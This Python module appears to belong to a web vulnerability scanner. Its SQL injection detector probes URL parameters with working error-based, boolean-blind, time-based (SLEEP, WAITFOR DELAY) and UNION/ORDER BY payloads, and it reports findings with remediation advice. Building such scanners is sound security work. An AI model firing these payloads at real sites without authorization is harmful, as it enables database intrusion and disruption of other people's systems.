from __future__ import annotations

import asyncio
import re
import time
from typing import Any
from urllib.parse import urlencode, urlparse, urlunparse, parse_qs

import httpx
import structlog

from ..core.base_scanner import BaseScanner
from ..models.enums import Severity, VulnType
from ..models.finding import Finding

logger = structlog.get_logger(__name__)

# Error-based SQLi detection patterns
SQLI_ERROR_PATTERNS = re.compile(
    r"(mysql_fetch|you have an error in your sql|ora-\d{5}|"
    r"pg::syntaxerror|sqlite3\.operationalerror|"
    r"unclosed quotation mark|microsoft ole db|"
    r"syntax error.*near|quoted string not properly terminated|"
    r"invalid query|sql syntax.*mysql|warning.*mysql|"
    r"mysqlclient|psycopg2|com\.mysql\.jdbc)",
    re.IGNORECASE,
)

SLEEP_PAYLOADS = [
    ("'; SELECT SLEEP(5)-- ", "mysql"),
    ("'; WAITFOR DELAY '0:0:5'-- ", "mssql"),
    ("' OR SLEEP(5)-- ", "mysql"),
    ("1; SELECT SLEEP(5)-- ", "mysql"),
    ("' AND SLEEP(5)-- ", "mysql"),
]

# Basic SQLi error payloads
ERROR_PAYLOADS = [
    "'",
    "''",
    "' OR '1'='1'-- -",
    "1 AND 1=CONVERT(int, @@version)--",
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, version()))--",
    "' OR 1=1--",
    "\" OR \"\"=\"",
    "' AND 1=2--",
]


def _inject_param(url: str, param: str, value: str) -> str:
    """Return URL with `param` replaced by `value`."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [value]
    new_query = urlencode(params, doseq=True)
    return urlunparse((
        parsed.scheme, parsed.netloc, parsed.path,
        parsed.params, new_query, "",
    ))


class SQLiScanner(BaseScanner):
    """SQL injection scanner implementing error-based, boolean-blind,
    time-based, and union-based techniques."""

    async def scan(self, url: str) -> list[Finding]:
        findings: list[Finding] = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        if not params:
            return findings

        for param_name in params:
            # 1. Error-based
            error_findings = await self._error_based(url, param_name)
            findings.extend(error_findings)
            if error_findings:
                continue  # confirmed, skip blind for this param

            # 2. Boolean-blind
            blind_findings = await self._boolean_blind(url, param_name)
            findings.extend(blind_findings)
            if blind_findings:
                continue

            # 3. Time-based blind
            time_findings = await self._time_based(url, param_name)
            findings.extend(time_findings)
            if time_findings:
                continue

            # 4. Union-based (only if no other finding)
            union_findings = await self._union_based(url, param_name)
            findings.extend(union_findings)

        return findings

    # ── 1. Error-based ────────────────────────────────────────────────────────

    async def _error_based(self, url: str, param: str) -> list[Finding]:
        findings: list[Finding] = []
        for payload in ERROR_PAYLOADS:
            try:
                test_url = _inject_param(url, param, payload)
                resp = await self._request("GET", test_url, follow_redirects=True)
                body = resp.text[:8000]
                match = SQLI_ERROR_PATTERNS.search(body)
                if match:
                    finding = Finding(
                        vuln_type=VulnType.SQLI,
                        severity=Severity.CRITICAL,
                        url=url,
                        parameter=param,
                        payload=payload,
                        evidence=body[max(0, match.start() - 50): match.end() + 100].strip(),
                        cvss_score=9.8,
                        cwe_id="CWE-89",
                        owasp_ref="A03:2021",
                        remediation=(
                            "Use parameterized queries / prepared statements. "
                            "Never concatenate user input into SQL strings."
                        ),
                    )
                    if await self._confirm_finding(finding):
                        findings.append(finding)
                        logger.info(
                            "sqli_error_based_found",
                            url=url,
                            param=param,
                            pattern=match.group(0)[:60],
                        )
                        return findings
            except (httpx.TimeoutException, httpx.ConnectError, Exception) as exc:
                logger.debug("sqli_error_based_request_failed", url=url, error=str(exc))
        return findings

    # ── 2. Boolean-blind ──────────────────────────────────────────────────────

    async def _boolean_blind(self, url: str, param: str) -> list[Finding]:
        true_payload = "' AND 1=1-- "
        false_payload = "' AND 1=2-- "
        try:
            true_url = _inject_param(url, param, true_payload)
            false_url = _inject_param(url, param, false_payload)
            resp_true = await self._request("GET", true_url)
            resp_false = await self._request("GET", false_url)
            diff = abs(len(resp_true.text) - len(resp_false.text))

            if diff > 50:
                finding = Finding(
                    vuln_type=VulnType.SQLI,
                    severity=Severity.CRITICAL,
                    url=url,
                    parameter=param,
                    payload=true_payload,
                    evidence=(
                        f"Boolean blind: TRUE response={len(resp_true.text)} bytes, "
                        f"FALSE response={len(resp_false.text)} bytes, diff={diff}"
                    ),
                    cvss_score=9.8,
                    cwe_id="CWE-89",
                    owasp_ref="A03:2021",
                    remediation=(
                        "Use parameterized queries / prepared statements."
                    ),
                )
                return [finding]
        except Exception as exc:
            logger.debug("sqli_boolean_blind_failed", url=url, error=str(exc))
        return []

    # ── 3. Time-based blind ───────────────────────────────────────────────────

    async def _time_based(self, url: str, param: str) -> list[Finding]:
        # Establish baseline with 3 clean requests
        baselines: list[float] = []
        try:
            clean_url = _inject_param(url, param, "1")
            for _ in range(3):
                t0 = time.monotonic()
                await self._request("GET", clean_url)
                baselines.append(time.monotonic() - t0)
        except Exception:
            return []

        baseline = sum(baselines) / len(baselines)

        for payload, db_type in SLEEP_PAYLOADS:
            try:
                test_url = _inject_param(url, param, payload)
                t0 = time.monotonic()
                await self._request("GET", test_url, timeout=15)
                elapsed = time.monotonic() - t0

                if elapsed > baseline + 4.5:
                    finding = Finding(
                        vuln_type=VulnType.SQLI,
                        severity=Severity.CRITICAL,
                        url=url,
                        parameter=param,
                        payload=payload,
                        evidence=(
                            f"Time-based blind ({db_type}): response={elapsed:.2f}s, "
                            f"baseline={baseline:.2f}s"
                        ),
                        cvss_score=9.8,
                        cwe_id="CWE-89",
                        owasp_ref="A03:2021",
                        remediation=(
                            "Use parameterized queries / prepared statements."
                        ),
                    )
                    logger.info(
                        "sqli_time_based_found",
                        url=url,
                        param=param,
                        elapsed=elapsed,
                        baseline=baseline,
                    )
                    return [finding]
            except httpx.TimeoutException:
                # A timeout may itself indicate a sleep injection worked
                elapsed = time.monotonic() - t0  # type: ignore[possibly-undefined]
                if elapsed > baseline + 4.5:
                    finding = Finding(
                        vuln_type=VulnType.SQLI,
                        severity=Severity.CRITICAL,
                        url=url,
                        parameter=param,
                        payload=payload,
                        evidence=(
                            f"Time-based blind (timeout after {elapsed:.1f}s, "
                            f"baseline={baseline:.2f}s)"
                        ),
                        cvss_score=9.8,
                        cwe_id="CWE-89",
                        owasp_ref="A03:2021",
                        remediation="Use parameterized queries / prepared statements.",
                    )
                    return [finding]
            except Exception as exc:
                logger.debug("sqli_time_based_request_failed", url=url, error=str(exc))

        return []

    # ── 4. Union-based ────────────────────────────────────────────────────────

    async def _union_based(self, url: str, param: str) -> list[Finding]:
        """Determine column count then attempt to extract DB version."""
        col_count = await self._find_column_count(url, param)
        if col_count == 0:
            return []

        # Build UNION payload — try to get version in each column position
        null_cols = ["NULL"] * col_count
        for i in range(col_count):
            null_cols[i] = "@@version"
            payload = f"' UNION SELECT {','.join(null_cols)}-- "
            null_cols[i] = "NULL"
            try:
                test_url = _inject_param(url, param, payload)
                resp = await self._request("GET", test_url)
                body = resp.text[:4000]
                # Look for version strings like "8.0.33" or "5.7"
                if re.search(r"\d+\.\d+\.\d+", body):
                    version_match = re.search(r"(\d+\.\d+[\.\d]*)", body)
                    evidence_text = version_match.group(0) if version_match else body[:200]
                    finding = Finding(
                        vuln_type=VulnType.SQLI,
                        severity=Severity.CRITICAL,
                        url=url,
                        parameter=param,
                        payload=payload,
                        evidence=f"UNION-based SQLi — DB version: {evidence_text}",
                        cvss_score=9.8,
                        cwe_id="CWE-89",
                        owasp_ref="A03:2021",
                        remediation="Use parameterized queries / prepared statements.",
                    )
                    logger.info("sqli_union_based_found", url=url, param=param, cols=col_count)
                    return [finding]
            except Exception as exc:
                logger.debug("sqli_union_based_failed", url=url, error=str(exc))

        return []

    async def _find_column_count(self, url: str, param: str) -> int:
        """Use ORDER BY to find the number of columns."""
        for n in range(1, 21):
            payload = f"' ORDER BY {n}-- "
            try:
                test_url = _inject_param(url, param, payload)
                resp = await self._request("GET", test_url)
                if SQLI_ERROR_PATTERNS.search(resp.text[:3000]):
                    return n - 1
            except Exception:
                break
        return 0
